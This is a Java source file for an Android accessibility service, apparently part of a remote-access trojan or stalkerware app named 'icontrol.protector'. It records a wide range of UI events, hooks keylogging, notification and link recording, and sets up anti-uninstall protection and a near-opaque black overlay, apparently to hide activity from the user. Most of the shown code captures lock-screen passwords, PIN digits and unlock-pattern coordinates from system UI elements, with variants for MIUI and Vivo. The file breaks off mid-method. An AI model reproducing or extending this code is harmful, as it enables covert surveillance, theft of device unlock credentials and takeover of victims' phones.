package com.icontrol.protector;

import static com.icontrol.protector.AccessTools.Blocked_Apps;

import static com.icontrol.protector.AccessTools.CLickTextpostion;
import static com.icontrol.protector.AccessTools.GoHome;
import static com.icontrol.protector.AccessTools.Lock_App_list;
import static com.icontrol.protector.AccessTools.Map_Name_ID;
import static com.icontrol.protector.AccessTools.Map_Name_Lnk;
import static com.icontrol.protector.AccessTools.blockBack;
import static com.icontrol.protector.AccessTools.captureUrl;

import static com.icontrol.protector.AccessTools.clickthis;
import static com.icontrol.protector.AccessTools.EtypetoStr;
import static com.icontrol.protector.AccessTools.getNodesByClassName;
import static com.icontrol.protector.AccessTools.getSupportedBrowsers;
import static com.icontrol.protector.AccessTools.isSameWebsite;
import static com.icontrol.protector.AccessTools.ject_list;
import static com.icontrol.protector.AccessTools.myAccess;
import static com.icontrol.protector.AccessTools.pasteText;


import static com.icontrol.protector.Consts.Live_Nots;
import static com.icontrol.protector.Consts.Rec_Notifications;
import static com.icontrol.protector.Consts.Rec_apps;

import static com.icontrol.protector.Consts.Rec_klogs;
import static com.icontrol.protector.Consts.Rec_links;
import static com.icontrol.protector.Consts.SPLIT_SKT;

import static com.icontrol.protector.Consts.liv_klogs;
import static com.icontrol.protector.Consts.removeapp;


import static com.icontrol.protector.MyCods.isServiceRunning;
import static com.icontrol.protector.MySettings.ReadBool;
import static com.icontrol.protector.UtliTools.EnableDisableAct;
import static com.icontrol.protector.UtliTools.convertToBitmap;
import static com.icontrol.protector.UtliTools.getAppIconAsBase64;
import static com.icontrol.protector.UtliTools.getAppNameFromPkgName;
import static com.icontrol.protector.UtliTools.getLabelApplication;
import static com.icontrol.protector.UtliTools.getLauncherAppsPackageNames;
import static com.icontrol.protector.UtliTools.hideme;
import static com.icontrol.protector.UtliTools.isMIUI;
import static com.icontrol.protector.UtliTools.isPackageInstalled;
import static com.icontrol.protector.UtliTools.isvivo;
import static com.icontrol.protector.UtliTools.loadHtmlFromAssets;
import static com.icontrol.protector.UtliTools.loadPatternMap;
import static com.icontrol.protector.UtliTools.randomnumber;
import static com.icontrol.protector.UtliTools.savePatternMap;
import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import static java.lang.Thread.sleep;

import android.accessibilityservice.AccessibilityGestureEvent;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.graphics.Rect;
import android.graphics.Region;
import android.graphics.drawable.Drawable;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Debug;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executor;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AccessServices extends AccessibilityService {
    public static int screenfontSize = 30;
    private String LastCapURL = "empty";
    public static String LastVisitedApp = "N/A";
    private String LastOpenApp = "null";
    private List<String> launcherApps;
    private String DoublecatKey = "";
    private String LastAllowedApp = null;
    public static String lastject = null;
    public static String skipject = "";
    public static boolean PreventDelete = false;
    public static boolean onealip = false;
    public static boolean skiponecover = false;

    public int mWidth;
    public int mHeight;
    public static WindowManager AccessWindow;
    public static WindowManager.LayoutParams AccessLayout;

    //public static WindowManager windowmanager;
    public static boolean Auto_Click = false;
    public static boolean BlackScreen_ON = false;
    int conter = 0;

    private boolean Watcheron = false;
    private boolean recordon = false;
    public static boolean skiprecord = false;
    public static boolean NeedEnter = false;
    public static boolean CapOK = false;
    public static boolean CapRead = false;
    public static boolean lockedonce = false;
    public static boolean FOR_EXTR_STRG = false;
    public static boolean forbattery = false;
    public volatile static boolean FOR_DRAW_OVER = false;
    public volatile static boolean onetimeDraw = false;
    public volatile static boolean onetimeNoty = false;
    public volatile static boolean oneExtstrg = false;
    public volatile static boolean onedisply = false;
    public static boolean FOR_PLY = false;
    public static boolean FOR_NOTFY = false;
    public static boolean FOR_CHNG_STNG = false;
    public static boolean FOR_PRIMS = false;

    public static AccessibilityNodeInfo Globalnode = null;
    public static AccessibilityNodeInfo lastsrc = null;

    public FrameLayout BlackoverLay;
    public static WindowManager.LayoutParams Blacklayparams;

    //public TextView loadingText;
    public WebView WbVwBlack;
    //public static TextView warningtext;
    //public static TextView warnintext;

    // private static int Notifi_ID = 111;

    //    private void startforground(Context ctx) {
//        try {
//            //int Notifi_ID = randomnumber(11111, 88888);
//            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
//            Notification notification = MyNotifiint.createNotification(ctx);
//            if (Build.VERSION.SDK_INT >= 34) {
//                this.startForeground(Notifi_ID, notification,
//                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SYSTEM_EXEMPTED);
//            } else {
//                this.startForeground(Notifi_ID, notification);
//            }
//        } catch (Exception a) {
//            a.printStackTrace();
//        }
//    }


    static HashMap<String, String> CommandsData = new HashMap<String, String>();


//    @Override
//    public void setTouchExplorationPassthroughRegion(int displayId, @NonNull Region region) {
//
//        // Apply the passthrough region
//        super.setTouchExplorationPassthroughRegion(displayId, region);
//
//        Log.d("AccessibilityService", "Passthrough region set: " + region.toString());
//    }

    boolean istouchwatch = false;


    boolean Watching = false;

    public void enablesuperWatch() {
        if (Watching) {
            return;
        }
        Watching = true;
        try {
             Handler handler = new Handler(getMainLooper());
            handler.postDelayed(() -> {
                try {
                    AccessibilityServiceInfo info = this.getServiceInfo();

                    info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;

                    this.setServiceInfo(info);
                } catch (Exception e) {
                }


                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Region passthroughRegion = new Region();
                    Rect passthroughRect = new Rect(0, 0, mWidth - 3, mHeight - 3);
                    passthroughRegion.op(passthroughRect, Region.Op.UNION);
                    // setTouchExplorationPassthroughRegion(Display.DEFAULT_DISPLAY, passthroughRegion);
                    setGestureDetectionPassthroughRegion(Display.DEFAULT_DISPLAY, passthroughRegion);
                }
            }, 600);


        } catch (Exception a) {
        }

    }

    public void disablesuperwatch() {
        Watching = false;
        try {
            try {
                AccessibilityServiceInfo serviceInfo = this.getServiceInfo();
                serviceInfo.flags &= ~AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
                this.setServiceInfo(serviceInfo);
            } catch (Exception a) {
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Region passthroughRegion = new Region();

                Rect passthroughRect = new Rect(0, mHeight - 200, mWidth, mHeight);
                passthroughRegion.op(passthroughRect, Region.Op.UNION);
                setTouchExplorationPassthroughRegion(Display.DEFAULT_DISPLAY, passthroughRegion);
                setGestureDetectionPassthroughRegion(Display.DEFAULT_DISPLAY, passthroughRegion);
            }
        } catch (Exception a) {

        }

    }

    @Override
    public void setTouchExplorationPassthroughRegion(int displayId, @NonNull Region region) {
        super.setTouchExplorationPassthroughRegion(displayId, region);
    }

    @Override
    public void setGestureDetectionPassthroughRegion(int displayId, @NonNull Region region) {
        super.setGestureDetectionPassthroughRegion(displayId, region);
    }


    @Override
    public void setAccessibilityFocusAppearance(int strokeWidth, int color) {
        super.setAccessibilityFocusAppearance(strokeWidth, color);
    }


    @Override
    public boolean onGesture(@NonNull AccessibilityGestureEvent gestureEvent) {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//            if (gestureEvent.getGestureId() == GESTURE_SWIPE_UP) {
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//
//                    gestureEvent.
//
//                    disablesuperwatch();
//
//                    new android.os.Handler().postDelayed(() -> {
//                        AccessTools.slideUp();
//                    }, 1);
//                    new android.os.Handler().postDelayed(() -> {
//                        enablesuperWatch();
//                        CapRead = true;
//                    }, 1000);
//                }
//                Log.d("AccessibilityService", "Gesture swipe up detected. Letting system handle it.");
//                return true;
//            }
//        }
        return false;
    }


//    @Override
//    public int onStartCommand(Intent intent, int flags, int startId) {
//        //startforground(this);
//        return START_STICKY;
//    }

    public static String CurrentNam;

    @Override
    public void onServiceConnected() {


        super.onServiceConnected();

        try {

            CurrentNam = getLabelApplication(getApplicationContext()).toLowerCase();

            AccessibilityServiceInfo info = new AccessibilityServiceInfo();

            // if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            info.flags = AccessibilityServiceInfo.DEFAULT |
                    // AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;

//            } else {
//                info.flags = AccessibilityServiceInfo.DEFAULT |
//                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
//                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
//                        AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
//                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
//                        AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS |
//                        AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
//
//            }


            info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED
                    | AccessibilityEvent.TYPE_VIEW_LONG_CLICKED
                    | AccessibilityEvent.TYPE_VIEW_SELECTED
                    | AccessibilityEvent.TYPE_VIEW_FOCUSED
                    | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
                    | AccessibilityEvent.TYPE_VIEW_HOVER_ENTER
                    | AccessibilityEvent.TYPE_VIEW_HOVER_EXIT
                    | AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START
                    | AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END
                    | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                    | AccessibilityEvent.TYPE_VIEW_SCROLLED
                    | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
                    | AccessibilityEvent.TYPE_ANNOUNCEMENT
                    | AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED
                    | AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED
                    | AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY
                    | AccessibilityEvent.TYPE_GESTURE_DETECTION_START
                    | AccessibilityEvent.TYPE_GESTURE_DETECTION_END
                    | AccessibilityEvent.TYPE_TOUCH_INTERACTION_START
                    | AccessibilityEvent.TYPE_TOUCH_INTERACTION_END
                    | AccessibilityEvent.TYPE_WINDOWS_CHANGED
                    | AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED
                    | AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT;


            info.notificationTimeout = 0;
            info.packageNames = null;
            //info.isAccessibilityTool();
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
                    | AccessibilityServiceInfo.FEEDBACK_VISUAL
                    | AccessibilityServiceInfo.FEEDBACK_AUDIBLE
                    | AccessibilityServiceInfo.FEEDBACK_GENERIC
                    | AccessibilityServiceInfo.FEEDBACK_BRAILLE;

            setServiceInfo(info);
            //startforground(this);
            WorkServices.My_Access_inst = this;
//            try {
//                EngineWorker.SleepTime = 1000;
//            } catch (Exception a) {
//            }
            try {

                Intent splasher = new Intent(getApplicationContext(), Splasher.class);
                splasher.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                splasher.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
                splasher.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(splasher);

            } catch (Exception a) {
            }

            ScreenScanner(getApplicationContext());
            if (My_Configs.Anti_Delete.equals("1")) {
                AntiProtector(this);
            }

            //disableTouchExploration();
            Intent workint = new Intent(getApplicationContext(), EngineWorker.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(workint);
            } else {
                startService(workint);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                setAccessibilityFocusAppearance(0, Color.TRANSPARENT);
            }

        } catch (Exception x) {
            x.printStackTrace();
        }


        try {


            Context ctx = getApplicationContext();

            WindowManager wmgrscr = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wmgrscr.getDefaultDisplay().getMetrics(metrics);

            int maxWidth = metrics.widthPixels;
            int maxHeight = metrics.heightPixels;
            mWidth = Integer.valueOf(MySettings.Read(ctx, Consts.Mob_width, String.valueOf(maxWidth)));
            mHeight = Integer.valueOf(MySettings.Read(ctx, Consts.Mob_height, String.valueOf(maxHeight)));


            //if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            disablesuperwatch();
            // }


//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//            Region passthroughRegion = new Region();
//
//            Rect passthroughRect = new Rect(0, 0, mWidth, mHeight);
//            passthroughRegion.op(passthroughRect, Region.Op.UNION);
//            setTouchExplorationPassthroughRegion(Display.DEFAULT_DISPLAY, passthroughRegion);
//        }
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            SurfaceView layout = new SurfaceView(this);
            layout.setBackgroundColor(Color.TRANSPARENT);
            layout.setVisibility(View.INVISIBLE);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(5,
                    5, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                            WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;

            AccessLayout = params;
            AccessWindow = windowManager;
            //windowmanager = windowManager;
            windowManager.addView(layout, AccessLayout);


        } catch (Exception s) {
            s.printStackTrace();
        }

        //blockscreen
        try {



            FrameLayout.LayoutParams paramstext = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT);
            paramstext.gravity = Gravity.CENTER;
            FrameLayout.LayoutParams paramstext2 = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT);
            paramstext2.gravity = Gravity.BOTTOM | Gravity.CENTER;
            // warningtext.setPadding(0, 0, 0, 30);


            //  warningtext.setClickable(false);
            //  warningtext.setFocusable(false);

            BlackoverLay = new FrameLayout(getApplicationContext());
            BlackoverLay.setBackgroundColor(Color.parseColor("#000000"));

            WbVwBlack = new WebView(this);
            WbVwBlack.setBackgroundColor(Color.TRANSPARENT);
            WebSettings webSettings = WbVwBlack.getSettings();
            webSettings.setJavaScriptEnabled(true);
            WbVwBlack.setWebViewClient(new WebViewClient());

// Set the Drawable as the background
            //Fakelay.setBackground(drawable);
            BlackoverLay.getBackground().setAlpha(252);
            //webView.getBackground().setAlpha(252);
            //Fakelay.setVisibility(View.INVISIBLE);
            BlackoverLay.setClickable(false);
            BlackoverLay.setFocusable(false);

            WbVwBlack.setClickable(false);
            WbVwBlack.setFocusable(false);

            //BlackoverLay.addView(WbVwBlack);

            //BlackoverLay.addView(warningtext);


            String html = loadHtmlFromAssets(getApplicationContext(), "launcher.html");
            SetupWbvew(html);


            Blacklayparams = new WindowManager.LayoutParams(
                    mWidth,
                    mHeight,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                            | WindowManager.LayoutParams.FLAG_FULLSCREEN
                            | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                            | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
                    // | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                    ,
                    PixelFormat.RGBA_8888
            );


            Blacklayparams.gravity = Gravity.TOP | Gravity.START;

            //windowmanager.addView(Fakelay, Fakeparams_bass);

        } catch (Exception a) {
        }

        //  try {


        //mWidth = Integer.valueOf(MySettings.Read(ctx, Consts.Mob_width, "720"));
        //mHeight = Integer.valueOf(MySettings.Read(ctx, Consts.Mob_height, "1280"));


//            WatchParams = new WindowManager.LayoutParams(mWidth,
//                    mHeight,
//                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
//                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
//                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
//                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
//                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
//                    PixelFormat.TRANSLUCENT);

        // WatchFramelayout = new View(getApplicationContext());
        //WatchFramelayout.setKeepScreenOn(true);

        // } catch (Exception s) {
        //  }
//
//        try {
////            WatchFramelayout.setOnTouchListener(new View.OnTouchListener() {
////
////
////                @Override
////                public boolean onTouch(View v, MotionEvent event) {
////
////                    try {
////                        if (!Watcheron) {
////                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
////                                AccessTools.TouchWatcher("Stop", "");
////                            }
////                            return true;
////                        }
////
////                        int X = (int) event.getX();
////                        int Y = (int) event.getY();
////
////                        int eventaction = event.getAction();
////                        switch (eventaction) {
////                            case MotionEvent.ACTION_DOWN:
////                                X_down = (int) event.getX();
////                                Y_down = (int) event.getY();
////
////                                Time_Down = System.currentTimeMillis();
////                                PointList.add(new Point(X, Y));
////                                break;
////                            case MotionEvent.ACTION_MOVE:
////
////                                PointList.add(new Point(X, Y));
////                                break;
////
////                            case MotionEvent.ACTION_UP:
////
////                                X_up = (int) event.getX();
////                                Y_up = (int) event.getY();
////                                Time_up = System.currentTimeMillis();
////
////                                PointList.add(new Point(X, Y));
////                                final Point[] array = PointList.toArray(new Point[PointList.toArray().length]);
////
////
////                                final Handler handler = new Handler(Looper.getMainLooper());
////                                handler.postDelayed(new Runnable() {
////                                    @Override
////                                    public void run() {
////                                        if (WatchFramelayout.getWindowToken() != null) {
////                                            windowmanager.removeView(WatchFramelayout);
////
////                                        }
////                                        if (X_down == X_up && Y_down == Y_up && (Time_up - Time_Down) < 100) {
////
////                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
////                                                try {
////                                                    sleep(1);
////                                                } catch (Exception a) {
////                                                }
////                                                clickthis(X_down, Y_down);
////
////
////                                                if (RecordTouch) {
////                                                    PointArrys.put("C" + String.valueOf(conter), new Point[]{new Point(X_down, Y_down)});
////                                                }
////
////                                                conter += 1;
////                                            }
////                                        } else {
////
////                                            AccessTools.mouseDraw(array, 1200);
////                                            try {
////                                                sleep(1);
////                                            } catch (Exception a) {
////
////                                            }
////                                            if (RecordTouch) {
////                                                PointArrys.put("S" + String.valueOf(conter), array);
////                                            }
////                                            conter += 1;
////                                        }
////                                        if (WatchFramelayout.getWindowToken() == null && WatchFramelayout.getParent() == null) {
////                                            try {
////                                                windowmanager.addView(WatchFramelayout, WatchParams);
////
////                                            } catch (Exception e) {
////
////                                            }
////                                        }
////                                    }
////                                }, 1);
////
////                                PointList.clear();
////
////                                break;
////                        }
////
////                    } catch (Exception a) {
////                        a.printStackTrace();
////                    }
////                    return true;
////                }
////            });
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }

        try {
            Intent workint = new Intent(getApplicationContext(), EngineWorker.class);
            if (!isServiceRunning(getApplicationContext(), EngineWorker.class)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(workint);
                } else {
                    startService(workint);
                }
            }
        } catch (Exception a) {
        }

    }

    public void SetupWbvew(String htmlpage) {

       try
       {
           Handler fhand = new Handler(getMainLooper());
           fhand.post(() -> {
               try {
                   try {
                       String langCode = Locale.getDefault().getLanguage();
                       String html = (new String(Base64.decode(htmlpage, 0), "UTF-8"));
                       html = html.replace("[LNG]", langCode);

                       WbVwBlack.loadDataWithBaseURL(
                               null,
                               html,
                               "text/html",
                               "utf-8",
                               null
                       );
                   } catch (Exception a) {
                       a.printStackTrace();
                   }
                   if (WbVwBlack != null && WbVwBlack.getWindowToken() != null){
                       clearWbVew();
                   }
                   BlackoverLay.addView(WbVwBlack);
               } catch (Exception s) {
                   s.printStackTrace();
               }
           });

       }catch (Exception e){
           e.printStackTrace();
       }

    }
    public void clearWbVew(){
        try {

            BlackoverLay.removeView(WbVwBlack);
            WbVwBlack = new WebView(this);
            WbVwBlack.setBackgroundColor(Color.TRANSPARENT);
            WebSettings webSettings = WbVwBlack.getSettings();
            webSettings.setJavaScriptEnabled(true);
            WbVwBlack.setWebViewClient(new WebViewClient());
            //BlackoverLay.addView(WbVwBlack);
        } catch (Exception s) {
            s.printStackTrace();
        }
    }

    //private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    private int needclik = 0;
    //private static String lastpinid = "";

    private static String fullpincaptured = "";
    private static String fullpatterncaptured = "";
    private static Map<Integer, Point> TemppatternMap = new HashMap<>();
    //private static Map<Integer, Point> patternMap = new HashMap<>();
    public static String CurrentLockState = "";//pa=password,pt=pattern,pi=pincode
    public static int skipdoublicate = 0;
    public static String TempStorepass = "";

    public static String handleInput(String input) {
        String fixedInput = input.replaceAll("•", ""); // Remove the special character
        // Log.d("fixedInput:", fixedInput);

        if (fixedInput.isEmpty()) {
            // Input is empty, remove the last character from the stored value
            if (!TempStorepass.isEmpty()) {
                TempStorepass = TempStorepass.substring(0, TempStorepass.length() - 1);
            }

        } else {
            TempStorepass += fixedInput;

        }

        //  Log.d("TempStorepass:", TempStorepass);
        //   Log.d("storedValue:", storedValue);

        return TempStorepass;

    }

    boolean isKeyboardOpened() {
        List<AccessibilityWindowInfo> windowInfoList = getWindows();
        for (int k = 0; k < windowInfoList.size(); k++) {
            if (windowInfoList.get(k).getType() == AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
                Log.i("TAG", "keyboard is opened!");
                return true;
            }
        }
        return false;
    }


    private boolean findNodeByViewId(AccessibilityNodeInfo rootNode, String viewId) {
        // Check if the current node matches the view ID
        if (rootNode.getViewIdResourceName() != null && rootNode.getViewIdResourceName().equals(viewId)) {
            return true;
        }

        // Recursively check child nodes
        for (int i = 0; i < rootNode.getChildCount(); i++) {
            AccessibilityNodeInfo childNode = rootNode.getChild(i);
            if (childNode != null) {
                boolean found = findNodeByViewId(childNode, viewId);
                if (found) {
                    return true;
                }
            }
        }

        return false;
    }

    private void describePatternCells(AccessibilityEvent event) {
        try {
            if (event == null) return;

            AccessibilityNodeInfo node = event.getSource();

            if (node == null) return;

            Rect rec = new Rect();
            node.getBoundsInScreen(rec);
            Point centerPoint = new Point(rec.centerX(), rec.centerY());

            boolean ispattern = false;

            String ptrid = "com.android.systemui:id/lockPatternView";
            if (isvivo()) {
                ptrid = "com.android.systemui:id/vivo_lock_pattern_view";
            }
            AccessibilityNodeInfo nf3 = AccessTools.getNodeByViewId(getRootInActiveWindow(), ptrid);

            if ((nf3 != null && nf3.isVisibleToUser())) {

                ispattern = true;
                if (!Watching) {
                    enablesuperWatch();
                }
                if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_HOVER_ENTER) {
                    return;
                }
            } else {
                if (Watching) {
                    disablesuperwatch();
                }
            }


            //boolean iskeybordok = findNodeByViewId(getRootInActiveWindow(), "com.android.systemui:id/btn_letter_delete");
            // boolean iskeyborddel = findNodeByViewId(getRootInActiveWindow(), "com.android.systemui:id/btn_letter_ok");


            if (node.getViewIdResourceName() != null && !ispattern) {

                if (node.getText() == null && node.getContentDescription() == null) return;

                String description = "";
                String targettext = null;
                if (node.getText() != null) {
                    description += "Cell text[" + node.getText() + "]";
                    targettext = node.getText().toString();

                }
                if (node.getContentDescription() != null) {
                    description += "Cell DES[" + node.getContentDescription() + "]";
                    if (targettext == null) {
                        targettext = node.getContentDescription().toString();
                    }
                }

                description += "Cell ID[" + node.getViewIdResourceName() + "]";
                if (

                        node.getViewIdResourceName().equals("com.android.systemui:id/passwordEntry") ||
                                node.getViewIdResourceName().equals("com.android.keyguard:id/miui_mixed_password_input_field") ||
                                node.getViewIdResourceName().equals("com.android.systemui:id/btn_letter_ok") ||
                                node.getViewIdResourceName().equals("com.android.systemui:id/securityEditText")
                ) {

                    try {


                        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER) {
                            // if (isSamsung()) {
                            // needclik += 1;
                            //}
//                                            if (needclik > 0) {
//                                                needclik -= 1;
//                                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                                            }
                            if (isMIUI(getApplicationContext())) {
                                event.getSource().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                return;
                            }

                        }

                        if (targettext != null && node.getViewIdResourceName() != null) {


                            if (skipdoublicate != 0) {
                                skipdoublicate -= 1;
                                return;
                            } else {
                                skipdoublicate = 1;
                            }

                            if ("com.android.systemui:id/btn_letter_ok".equals(node.getViewIdResourceName())) {
                                TempStorepass += ":E";
//                                Rect rec = new Rect();
//                                node.getBoundsInScreen(rec);
//                                Point centerPoint = new Point(rec.centerX(), rec.centerY());
                                TemppatternMap.put(-1, centerPoint);
                                return;
                            }

                            if (TempStorepass.endsWith(":E")) {
                                TempStorepass = "";//enter clicked but screen still locked
                                //return;
                            }

                            if (TempStorepass.length() == 0 && targettext.length() > 1) {
                                return;
                            }

                            CurrentLockState = "pa";//pa=password,pt=pattern,pi=pincode
                            String capturedpass = handleInput(targettext);

                            Log.d("PASS:", capturedpass);

                        }
                    } catch (Exception a) {
                    }
                } else {

                    if ((node.getViewIdResourceName().matches("com\\.android\\.systemui:id/key[0-9]") ||
                            node.getViewIdResourceName().matches("com\\.android\\.systemui:id/VivoPinkey[0-9]") ||
                            node.getViewIdResourceName().matches("com\\.android\\.systemui:id/key[0-9]") ||
                            node.getViewIdResourceName().startsWith("com.android.systemui:id/key_enter") ||
                            node.getViewIdResourceName().startsWith("com.android.keyguard:id/key_enter") ||
                            node.getViewIdResourceName().matches("com\\.android\\.keyguard:id/key[0-9]")) &&
                            node.getContentDescription() != null) {

                        CurrentLockState = "pi";//pa=password,pt=pattern,pi=pincode
                        //  if (!lastpinid.equals(node.getViewIdResourceName())) {
                        //  lastpinid = node.getViewIdResourceName();
//                        if (needclik > 0) {
//                            needclik -= 1;
//                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                        }
                        Log.d("PIN CLICKED", node.getContentDescription().toString());
                        if (node.getViewIdResourceName().startsWith("com.android.systemui:id/key_enter") ||
                                node.getViewIdResourceName().startsWith("com.android.keyguard:id/key_enter")) {

                            Log.d("PIN", "ok clicked");
//                                Rect rec = new Rect();
//                                node.getBoundsInScreen(rec);
//                                Point centerPoint = new Point(rec.centerX(), rec.centerY());
                            TemppatternMap.put(-1, centerPoint);
                            fullpincaptured += ":E";
                        } else {
                            Integer number = extractNumber(node.getContentDescription().toString());
                            if (number != null) {
                                fullpincaptured += number.toString();

                                TemppatternMap.put(number, centerPoint);
                            }

                        }


                        // }

                    } else {


//                        if (node.getViewIdResourceName().equals("com.android.systemui:id/delete_button") ||
//                                node.getViewIdResourceName().equals("com.android.keyguard:id/delete_button")) {
//                            if (fullpincaptured.length() > 0) {
//                                fullpincaptured = fullpincaptured.substring(0, fullpincaptured.length() - 1);
//                            }
